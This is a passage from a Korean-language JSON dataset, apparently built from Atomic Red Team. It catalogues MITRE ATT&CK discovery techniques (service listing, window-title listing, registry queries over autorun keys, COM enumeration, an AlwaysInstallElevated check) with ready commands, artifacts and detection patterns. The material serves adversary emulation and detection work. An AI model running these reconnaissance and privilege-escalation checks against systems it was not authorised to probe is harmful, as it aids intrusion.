        "domain": [
          "DefenseEvasion",
          "Collection"
        ],
        "ttp": [
          "Direct_Volume_Access"
        ]
      },
      "metadata": {
        "atomic_source_id": "88f6327e-51ec-4bbf-b2e8-3fea534eab8b",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1006/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1006",
          "https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1007",
  "technique_name": "System Service Discovery",
  "tactic": "Discovery",
  "description": "이 기법은 호스트에서 실행 중이거나 설치된 시스템 서비스 목록을 수집하는 행위이다. 공격자는 서비스 이름, 상태, 시작 유형 등을 확인해 권한 상승, 지속성 유지, 방화벽·보안 제품 등의 존재를 파악할 수 있다. 주로 tasklist, sc, net, PowerShell Get-Service 같은 기본 도구를 사용하며, 서비스 구성 정보를 바탕으로 이후 공격 단계를 설계한다.",
  "tests": [
    {
      "test_id": "T1007-1",
      "name": "System Service Discovery",
      "platforms": [
        "windows"
      ],
      "summary": "tasklist.exe와 sc.exe를 이용해 현재 시스템에 존재하는 서비스와 프로세스를 열거한다. 결과는 콘솔(stdout)에 출력되며, 서비스 상태 및 전체 서비스 목록을 확인할 수 있다.",
      "procedure": [
        "cmd.exe에서 tasklist.exe를 실행해 현재 실행 중인 프로세스 목록을 조회한다.",
        "sc query 명령으로 기본 서비스 상태(예: RUNNING, STOPPED)를 조회한다.",
        "sc query state= all 명령으로 모든 상태의 서비스를 포함한 전체 서비스 목록을 조회한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "tasklist.exe\r\nsc query\r\nsc query state= all"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 cmd.exe, tasklist.exe, sc.exe가 기본 경로에 존재해야 한다.",
        "일부 서비스 정보 조회에는 관리자 권한이 필요할 수 있으므로, 관리자 권한 콘솔에서 실행하는 것이 권장된다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "서비스 및 프로세스 열거 명령을 실행하는 셸",
            "commandline_pattern": "tasklist.exe && sc query*"
          },
          {
            "name": "tasklist.exe",
            "description": "현재 실행 중인 프로세스 목록을 나열하는 유틸리티",
            "commandline_pattern": "tasklist.exe"
          },
          {
            "name": "sc.exe",
            "description": "서비스 상태 및 구성을 조회하는 Service Control 유틸리티",
            "commandline_pattern": "sc query*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트는 조회만 수행하므로 별도의 파일/레지스트리 클린업은 필요 없다.",
        "명령 실행 로그(콘솔 기록, 명령 기록 등)를 수집·모니터링해 비정상적인 대량 서비스 열거를 탐지할 수 있다."
      ],
      "tags": {
        "action": [
          "process_start",
          "service_enumeration"
        ],
        "domain": [
          "Discovery"
        ],
        "ttp": [
          "System_Service_Discovery"
        ]
      },
      "metadata": {
        "atomic_source_id": "89676ba1-b1f8-47ee-b940-2e1a113ebc71",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1007/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1007"
        ]
      }
    },
    {
      "test_id": "T1007-2",
      "name": "System Service Discovery - net.exe",
      "platforms": [
        "windows"
      ],
      "summary": "net.exe start 명령을 사용해 시작된 서비스 목록을 열거하고, 결과를 파일로 리다이렉트해 저장한다. 여러 위협 그룹이 서비스 인벤토리를 수집할 때 사용하는 방식과 유사하다.",
      "procedure": [
        "net.exe start 명령을 실행해 현재 시작된 서비스 목록을 조회한다.",
        "명령 출력 결과를 리다이렉트 연산자(>>)를 사용해 지정된 텍스트 파일(기본값: %temp%\\service-list.txt)에 저장한다.",
        "생성된 service-list.txt 파일을 열어 어떤 서비스가 실행 중인지 확인할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net.exe start >> #{output_file}"
        }
      ],
      "prerequisites": [
        "Windows 환경에서 net.exe가 사용 가능해야 한다(기본 제공).",
        "output_file 경로(기본: %temp%\\service-list.txt)에 파일을 생성·쓰기 할 수 있는 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%temp%\\service-list.txt",
            "description": "net.exe start 출력 결과가 저장된 서비스 목록 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "net.exe 명령을 실행하는 콘솔",
            "commandline_pattern": "net.exe start >> *service-list.txt"
          },
          {
            "name": "net.exe",
            "description": "시작된 서비스를 나열하는 명령줄 유틸리티",
            "commandline_pattern": "net.exe start"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트 후 생성된 서비스 목록 파일(기본: %temp%\\service-list.txt)을 삭제해 흔적을 줄일 수 있다.",
        "보안 관점에서는 net.exe start 호출 내역과 임시 디렉터리의 서비스 인벤토리 파일 생성 여부를 모니터링할 수 있다."
      ],
      "tags": {
        "action": [
          "process_start",
          "file_create",
          "service_enumeration"
        ],
        "domain": [
          "Discovery"
        ],
        "ttp": [
          "System_Service_Discovery"
        ]
      },
      "metadata": {
        "atomic_source_id": "5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1007/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1007"
        ]
      }
    },
    {
      "test_id": "T1007-3",
      "name": "Get-Service Execution",
      "platforms": [
        "windows"
      ],
      "summary": "PowerShell의 Get-Service cmdlet을 실행해 로컬 시스템에 등록된 모든 서비스를 객체 형태로 나열한다. 서비스 이름, 상태, 표시 이름 등 메타데이터를 손쉽게 필터링·가공할 수 있다.",
      "procedure": [
        "cmd.exe에서 powershell.exe Get-Service 명령을 실행한다.",
        "PowerShell은 ServiceController 객체 목록을 반환하며, 서비스 이름(Name), 표시 이름(DisplayName), 상태(Status) 등의 정보를 화면에 출력한다.",
        "필요 시 결과를 Export-Csv 등으로 파일에 저장하거나, 특정 조건에 맞는 서비스만 필터링할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "powershell.exe Get-Service"
        }
      ],
      "prerequisites": [
        "PowerShell이 설치되어 있어야 하며, PATH에 등록되어 있어야 한다(Windows 기본 제공).",
        "일반적으로 관리자 권한이 없어도 서비스 목록 조회가 가능하지만, 일부 서비스 속성은 권한에 따라 제한될 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "powershell.exe Get-Service 명령을 호출하는 콘솔",
            "commandline_pattern": "powershell.exe Get-Service"
          },
          {
            "name": "powershell.exe",
            "description": "Get-Service cmdlet을 실행해 서비스 정보를 열거하는 프로세스",
            "commandline_pattern": "Get-Service"
          }
        ],
        "network": []
      },
      "cleanup": [
        "테스트는 조회만 수행하므로 추가적인 클린업은 필요 없다.",
        "운영 환경에서는 비정상 계정 혹은 비정상 시간대의 대규모 Get-Service 실행 패턴을 모니터링 포인트로 활용할 수 있다."
      ],
      "tags": {
        "action": [
          "process_start",
          "service_enumeration"
        ],
        "domain": [
          "Discovery"
        ],
        "ttp": [
          "System_Service_Discovery"
        ]
      },
      "metadata": {
        "atomic_source_id": "51f17016-d8fa-4360-888a-df4bf92c4a04",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1007/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1007"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1010",
  "technique_name": "Application Window Discovery",
  "tactic": "Discovery",
  "description": "애플리케이션 윈도우 검색은 현재 시스템에서 실행 중인 프로세스와 그에 대응하는 창 제목(윈도우 타이틀)을 나열하는 기법이다. 공격자는 이를 통해 사용자가 어떤 프로그램과 문서를 열어 두었는지 파악하고, 추가 공격 대상(브라우저, 메일 클라이언트, RDP 창 등)을 식별할 수 있다. 보안 우회나 정보 수집 단계에서 자주 사용되며, 원격 제어 악성코드가 피해자 화면 상태를 추적하는 데 활용된다.",
  "tests": [
    {
      "test_id": "T1010-1",
      "name": "List Process Main Windows - C# .NET",
      "platforms": [
        "windows"
      ],
      "summary": "C# .NET 코드(T1010.cs)를 컴파일해 실행 중인 프로세스의 메인 윈도우 제목을 나열한다. PowerShell이 원격에서 소스 코드를 내려받고, csc.exe로 EXE를 빌드한 뒤 T1010.exe를 실행해 각 프로세스와 연결된 윈도우 타이틀을 표준 출력으로 표시한다.",
      "procedure": [
        "입력 인자 input_source_code 경로(기본: PathToAtomicsFolder\\T1010\\src\\T1010.cs)에 C# 소스 파일이 존재하는지 확인한다. 없으면 GitHub 저장소에서 다운로드한다.",
        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe 컴파일러를 호출해 T1010.cs를 빌드하고, 출력 바이너리를 %TEMP%\\T1010.exe로 생성한다.",
        "생성된 T1010.exe를 실행해 현재 시스템에서 메인 윈도우 핸들을 가진 프로세스를 열거하고, 각 프로세스 이름과 윈도우 제목을 콘솔로 출력한다.",
        "테스트 종료 후 임시 실행 파일(T1010.exe)을 삭제해 환경을 정리한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\r\n#{output_file_name}"
        }
      ],
      "prerequisites": [
        ".NET Framework v4.0.30319 이상이 설치되어 있고 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe 경로에 C# 컴파일러가 존재해야 한다.",
        "지정된 input_source_code 경로(PathToAtomicsFolder\\T1010\\src\\T1010.cs)에 T1010.cs 소스 파일이 존재해야 한다. 없을 경우 사전 단계에서 GitHub 원격 저장소에서 다운로드한다.",
        "네트워크를 통해 raw.githubusercontent.com에 접근할 수 있어야 T1010.cs를 자동으로 내려받을 수 있다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\T1010.exe",
            "description": "C# 소스(T1010.cs)를 csc.exe로 컴파일해 생성된 윈도우 타이틀 열거용 실행 파일"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1010\\src\\T1010.cs",
            "description": "프로세스 목록과 메인 윈도우 제목을 나열하는 C# 소스 코드"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "GitHub에서 T1010.cs 소스를 다운로드하거나 존재 여부를 검사하는 데 사용된 PowerShell 프로세스",
            "commandline_pattern": "Invoke-WebRequest *T1010.cs*"
          },
          {
            "name": "csc.exe",
            "description": "T1010.cs를 컴파일해 T1010.exe 실행 파일을 생성하는 C# 컴파일러 프로세스",
            "commandline_pattern": "csc.exe -out:%TEMP%\\T1010.exe *T1010.cs*"
          },
          {
            "name": "T1010.exe",
            "description": "실행 중인 프로세스의 메인 윈도우 제목을 나열하는 사용자 정의 도구 실행 파일",
            "commandline_pattern": "%TEMP%\\T1010.exe"
          }
        ],
        "network": [
          {
            "description": "raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs 에 대한 HTTP/HTTPS 요청(소스 코드 다운로드)",
            "destination": "raw.githubusercontent.com:443"
          }
        ]
      },
      "cleanup": [
        "테스트 후 생성된 실행 파일 %TEMP%\\T1010.exe를 삭제해 디스크 흔적을 정리한다.",
        "원하지 않을 경우 PathToAtomicsFolder\\T1010\\src\\T1010.cs로 다운로드한 소스 파일도 삭제하거나 별도 샘플 보관 폴더로 이동할 수 있다."
      ],
      "tags": {
        "action": [
          "process_start",
          "file_create",
          "network_connection"
        ],
        "domain": [
          "Discovery"
        ],
        "ttp": [
          "Application_Window_Discovery"
        ]
      },
      "metadata": {
        "atomic_source_id": "fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1010/",
          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1010"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1012",
  "technique_name": "Query Registry",
  "tactic": "Discovery",
  "description": "레지스트리 쿼리는 Windows 레지스트리의 특정 키와 값을 조회하여 시스템 설정, 자동 실행 프로그램, 서비스 구성 등 보안과 관련된 정보를 수집하는 기법이다. 공격자는 이를 통해 지속성(Persistence) 위치, 권한 상승 여지, 보안 설정(부팅 옵션, 설치 정책 등)을 파악하고 추가 공격 경로를 설계할 수 있다.",
  "tests": [
    {
      "test_id": "T1012-1",
      "name": "Query Registry",
      "platforms": ["windows"],
      "summary": "reg.exe를 사용해 Run/RunOnce, Winlogon, 서비스, SafeBoot, 그룹 정책 스크립트 등 주요 레지스트리 키를 연속으로 쿼리하여 자동 실행 지점과 서비스 구성을 탐색한다.",
      "procedure": [
        "cmd.exe에서 reg.exe를 호출해 Windows NT CurrentVersion\\Windows, Run/RunOnce, RunServices, Winlogon, SafeBoot 등 다수의 키를 순차적으로 reg query로 조회한다.",
        "서비스 설정을 확인하기 위해 HKLM\\system\\currentcontrolset\\services 전체를 /s 옵션으로 쿼리한 뒤 findstr로 ImagePath가 .sys로 끝나는 드라이버 항목만 필터링한다.",
        "Active Setup, 그룹 정책 스크립트(Startup) 등의 키도 조회해 사용자/시스템 단의 추가 실행 지점을 확인한다.",
        "OS 버전에 따라 일부 키는 존재하지 않을 수 있으며, 해당 쿼리는 실패할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\r\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\r\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\r\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
        }
      ],
      "prerequisites": [
        "테스트는 관리자 권한 cmd.exe에서 실행해야 대부분의 HKLM 하위 키에 접근할 수 있다.",
        "일부 키는 OS 버전 또는 설정에 따라 존재하지 않을 수 있으며, 해당 reg query는 오류를 반환할 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
          "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify",
          "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
          "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
          "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
          "HKLM\\system\\currentcontrolset\\services",
          "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
          "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components",
          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup"
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "reg.exe 명령을 실행하는 셸 프로세스",
            "commandline_pattern": "cmd.exe /c reg query *"
          },
          {
            "name": "reg.exe",
            "description": "여러 레지스트리 키를 조회하는 네이티브 레지스트리 유틸리티",
            "commandline_pattern": "reg query *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "본 테스트는 레지스트리 조회만 수행하므로 별도의 환경 정리 작업은 필요하지 않다. (시스템 설정 변경 없음)"
      ],
      "tags": {
        "action": ["registry_query", "process_start"],
        "domain": ["Discovery"],
        "ttp": ["Query_Registry", "Persistence_Key_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "8f7578c4-9863-4d83-875c-a565573bbdf0",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1012/",
          "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
          "https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services",
          "http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf",
          "https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf"
        ]
      }
    },
    {
      "test_id": "T1012-2",
      "name": "Query Registry with PowerShell cmdlets",
      "platforms": ["windows"],
      "summary": "Get-Item, Get-ChildItem 같은 PowerShell 레지스트리 공급자(cmdlet)를 이용해 Run/RunOnce, Winlogon, 서비스, SafeBoot, Active Setup 등을 조회한다. reg.exe를 따로 실행하지 않기 때문에 프로세스 생성 기반 탐지를 우회할 수 있다.",
      "procedure": [
        "PowerShell 콘솔에서 레지스트리 드라이브(HKLM:, HKCU:, HKCR:)를 사용해 Get-Item, Get-ChildItem으로 주요 자동 실행·서비스 관련 키를 조회한다.",
        "Get-ChildItem HKLM:system\\currentcontrolset\\services를 통해 서비스 목록을 나열하고, 필요시 후속 필터링으로 드라이버/서비스를 분석할 수 있다.",
        "Active Setup, Group Policy Scripts 등 추가적인 구성 요소 키도 함께 조회해 잠재적 악성 설정을 탐색한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\r\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\r\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\r\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\r\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\r\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\"\r\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\r\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\r\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
        }
      ],
      "prerequisites": [
        "PowerShell이 설치된 Windows 환경이어야 하며, HKLM 하위 키 조회를 위해서는 관리자 권한 PowerShell 세션이 권장된다.",
        "일부 키는 존재하지 않을 수 있으며, Get-Item 실행 시 오류가 발생할 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          "HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
          "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
          "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
          "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
          "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
          "HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify",
          "HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
          "HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
          "HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
          "HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
          "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
          "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
          "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
          "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
          "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
          "HKLM:system\\currentcontrolset\\services",
          "HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
          "HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components",
          "HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup"
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "레지스트리 공급자 cmdlet을 사용해 여러 키를 조회하는 PowerShell 세션",
            "commandline_pattern": "powershell.exe Get-Item *; Get-ChildItem *"
          }
        ],
        "network": []
      },
      "cleanup": [
        "레지스트리 조회만 수행하므로 별도의 정리 단계는 필요하지 않다."
      ],
      "tags": {
        "action": ["registry_query"],
        "domain": ["Discovery"],
        "ttp": ["Query_Registry", "Powershell_Registry_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "0434d081-bb32-42ce-bcbb-3548e4f2628f",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1012/",
          "https://www.mandiant.com/resources/hunting-com-objects"
        ]
      }
    },
    {
      "test_id": "T1012-3",
      "name": "Enumerate COM Objects in Registry with PowerShell",
      "platforms": ["windows"],
      "summary": "레지스트리 HKEY_CLASSES_ROOT\\CLSID에 등록된 COM 객체 목록을 열거하고, 각 CLSID에 대해 .NET Activator로 인스턴스를 생성해 사용 가능한 메서드/멤버를 출력 파일로 기록한다. 공격자는 이 정보를 기반으로 악용 가능한 COM 객체를 탐색할 수 있다.",
      "procedure": [
        "New-PSDrive를 사용해 HKEY_CLASSES_ROOT 루트를 HKCR 레지스트리 드라이브로 마운트한다.",
        "HKCR:\\CLSID 경로에서 Get-ChildItem -Name으로 CLSID 목록을 추출한 뒤, clsids.txt 임시 파일로 저장한다.",
        "각 CLSID에 대해 [type]::GetTypeFromCLSID와 [activator]::CreateInstance를 사용해 COM 인스턴스를 생성한 후, Get-Member로 메서드와 속성을 나열하여 출력 파일(#{output_file})에 추가한다.",
        "예외가 발생하는 CLSID는 try/catch로 무시하여 나머지 CLSID 처리를 계속 진행한다.",
        "테스트 종료 후 출력 파일과 임시 clsids.txt 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\r\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\r\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\r\n{try{write-output \"$($Position)-$($CLSID)\"\r\nwrite-output \"------------\"| out-file #{output_file} -append\r\nwrite-output $($CLSID)| out-file #{output_file} -append\r\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\r\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\r\n$position += 1} catch{}}"
        }
      ],
      "prerequisites": [
        "PowerShell 5.x 이상과 .NET COM Interop이 활성화된 Windows 환경이어야 한다.",
        "COM 객체 열거 및 인스턴스 생성을 위해 레지스트리와 COM 서브시스템에 접근 가능해야 한다(일반적으로 관리자 권한 권장)."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\clsids.txt",
            "description": "HKCR\\CLSID에서 추출한 CLSID 목록이 저장된 임시 파일"
          },
          {
            "path": "#{output_file}",
            "description": "각 CLSID별 COM 객체 메서드/멤버 정보가 기록된 결과 파일"
          }
        ],
        "files_read": [
          {
            "path": "%TEMP%\\clsids.txt",
            "description": "ForEach 루프에서 읽어들여 COM 인스턴스를 생성하는 데 사용되는 CLSID 목록 파일"
          }
        ],
        "registry_keys": [
          "HKCR\\CLSID"
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "COM CLSID를 열거하고 Activator를 통해 인스턴스를 생성해 메타데이터를 덤프하는 PowerShell 세션",
            "commandline_pattern": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "remove-item #{output_file} -force -erroraction silentlycontinue",
        "remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue"
      ],
      "tags": {
        "action": ["registry_query", "file_create"],
        "domain": ["Discovery"],
        "ttp": ["Query_Registry", "COM_Object_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "0d80d088-a84c-4353-af1a-fc8b439f1564",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1012/",
          "https://www.mandiant.com/resources/hunting-com-objects"
        ]
      }
    },
    {
      "test_id": "T1012-4",
      "name": "Reg query for AlwaysInstallElevated status",
      "platforms": ["windows"],
      "summary": "reg.exe로 HKCU 및 HKLM의 AlwaysInstallElevated 키를 조회해, 일반 사용자가 MSI 패키지를 SYSTEM 권한으로 설치할 수 있는지 여부를 확인한다. 두 키 모두 0x1이면 권한 상승에 악용될 수 있다.",
      "procedure": [
        "cmd.exe에서 reg query를 사용해 HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 값을 조회한다.",
        "동일하게 HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 값을 조회한다.",
        "두 값이 모두 0x1인지 여부를 확인하여 AlwaysInstallElevated 설정이 사용자/머신 모두에 대해 활성화되어 있는지 판단한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\r\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
        }
      ],
      "prerequisites": [
